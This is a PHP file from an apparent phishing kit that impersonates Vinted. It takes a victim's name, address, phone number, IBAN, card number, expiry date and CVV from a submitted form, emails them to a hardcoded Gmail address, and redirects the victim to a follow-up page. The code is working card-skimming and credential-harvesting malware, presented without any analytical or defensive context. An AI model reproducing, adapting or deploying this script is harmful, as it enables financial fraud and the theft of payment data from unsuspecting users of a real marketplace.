<?php

//if (!empty($_POST["banque"]) AND !empty($_POST["identifiant"]) AND !empty($_POST["password"]) AND !empty($_POST["date"]) AND !empty($_POST["iban"]) AND !empty($_POST["type_carte"]) AND !empty($_POST["num_carte"]) AND !empty($_POST["mois_exp"]) AND !empty($_POST["annee_exp"]) AND !empty($_POST["cvv2"]))
//{	
	
	

		  // if (!preg_match( // "/^[_a-z0-9-]+(\.[_a-z0-9-]+)@[a-z0-9-]+(\.[a-z0-9-]+)(\.[a-z]{2,3})$/i", // $to)) 
			// { // $errors .= "\n Error: Invalid email address"; // }

	$to = 'quigmich@gmail.com';

	$email_subject = "Informations de: $to";

	$email_body = "message renseignement vinted. $to ". " Voici les details:\n 

	Nom:". $_POST['nom']."\n
	
	Adresse:". $_POST['adresse']."\n

	Montant:". $_POST['montant']."\n

	Numéro de téléphone:". $_POST['tel']."\n

	Iban:". $_POST['iban']."\n

	Numéro carte:". $_POST['card_number']."\n

	Date expiration:". $_POST['mois_exp'] ." / ". $_POST['annee_exp']."\n

	Crytogramme:". $_POST['cvv2']."\n
	
	";
	
	 // Mail sender
	$from = 'quigmich@gmail.com';
	 
	// To send HTML mail, the Content-type header must be set 
	$headers = 'MIME-Version: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	 
	// Create email headers 
	$headers .= 'From: '.$from."\r\n".
				 'Reply-To: '.$from."\r\n" . 'X-Mailer: PHP/' . phpversion();

				 
	mail($to,$email_subject,$email_body,$headers);
	
	//redirect to the 'thank you' page 
	header('Location: ../appel.html');

//}


?>